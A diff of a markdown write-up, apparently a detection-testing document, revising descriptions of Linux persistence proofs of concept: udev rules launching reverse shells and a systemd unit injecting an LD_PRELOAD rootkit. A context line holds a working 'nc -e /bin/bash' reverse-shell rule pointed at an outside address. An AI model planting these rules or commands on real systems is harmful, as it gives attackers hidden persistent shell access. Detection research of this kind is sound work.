@@ -50,7 +50,7 @@ ACTION=="add", KERNEL=="rtc0", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/
 
 ### PoC 1.2: Udev Process Tree Detachment & Inline Python Reverse Shell
 
-**Vector:** Because `systemd-udevd` enforces a strict execution timeout and terminates child processes within its cgroup once a rule finishes, attackers target a deterministic network interface initialization event (`SUBSYSTEM=="net", KERNEL=="eth0"`) and pipe a fileless inline Python reverse shell (`python3 -c`) into the `at` daemon (`echo ... | at now`) to decouple execution from the udev cgroup and persist once networking comes online.
+**Vector:** Attackers target network interface events (`SUBSYSTEM=="net", KERNEL=="eth0"`) to ensure connectivity is ready, pairing `at` process detachment with a fileless inline Python reverse shell (`python3 -c`) to avoid relying on `netcat` binaries
 
 **Simulated File:** `99-network-sync.rules`
 
@@ -64,7 +64,7 @@ ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth0", RUN+="/bin/sh -c 'echo \"python
 
 **PoC Evidence:**
 
-[![Udev Python Detection](assets/test-udev-at.png)](assets/test-udev-at.png)
+[![Udev Python Detection](assets/test-udev-net.png)](assets/test-udev-net.png)
 
 ---
 
@@ -72,7 +72,7 @@ ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth0", RUN+="/bin/sh -c 'echo \"python
 
 ### PoC 2.1: Systemd Environment Injection & Encoded Evasion
 
-**Vector:** Attackers utilize the `Environment=` directive to silently inject userland rootkit libraries (`LD_PRELOAD`) into the service context, completely separating the malicious injection from the seemingly benign Base64-encoded `ExecStart` command.
+**Vector:** Attackers utilize the `Environment=` directive to silently inject a userland rootkit library (`LD_PRELOAD`) that is inherited by child processes spawned via `ExecStart=`, cloaking the obfuscated Base64 reverse shell from standard process and network inspection tools while splitting malicious indicators across separate unit directives.
 
 **Simulated File:** `backdoor.service`
 
